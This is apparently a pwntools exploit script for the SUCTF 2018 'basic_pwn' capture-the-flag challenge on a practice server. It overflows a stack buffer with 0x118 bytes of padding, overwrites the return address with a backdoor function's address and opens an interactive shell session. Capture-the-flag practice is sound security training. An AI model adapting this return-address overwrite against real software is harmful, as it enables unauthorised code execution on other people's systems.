from pwn import *


# p = process("./SUCTF_2018_basic_pwn")
p = remote("node4.buuoj.cn", 28642)


back_door = 0x0401157

pad = cyclic(0x110+0x8)+p64(back_door)
p.sendline(pad)

p.interactive()

